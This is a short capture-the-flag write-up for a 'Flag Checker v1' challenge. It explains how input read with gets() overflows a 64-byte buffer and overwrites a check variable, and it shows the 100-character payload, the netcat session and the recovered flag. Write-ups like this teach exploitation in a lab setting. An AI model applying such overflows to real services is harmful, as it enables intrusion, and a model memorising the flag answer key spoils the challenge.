
# Misc: Flag Checker v1
<br>

**Points**:  300
**Hint:** 'A'\* x  ; whats x?

**Challenge description:**
```
We made a flag checker so that you can check if your flags are right.

nc glitchctf.games 64700
```
### Attachments:
flag_checker_v1.c

## Solve

Provided the C source code file, analyze the code to find vulnerable code.
The code uses gets() in line 21.

gets() doesn't check for bounds which can be used to overflow the buffer.
The objective must be to set flagCheck = 1 which will execute the if condition and thus print the flag.

To do that you simply have to overflow the FLAG_BUFF[64].
since the buffer size is 64, the offset must be more than that. 


```python
#create chars more than 64
print('A'*100)
``` 

```bash
nc glitchctf.games 64700

+---------------------[ Flag Checker ]---------------------+

[ Enter your flag ]=> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

That isn't the flag we are looking for :(
GLITCH{Cry1ng_0ver_5p1lt_buff3r} 

``` 

The above worked since the gets() get overflow and thus filling the int flagcheck value with "A"s. Therefore the if condition is true.


#### Flag:
```plaintext
GLITCH{Cry1ng_0ver_5p1lt_buff3r} 
```
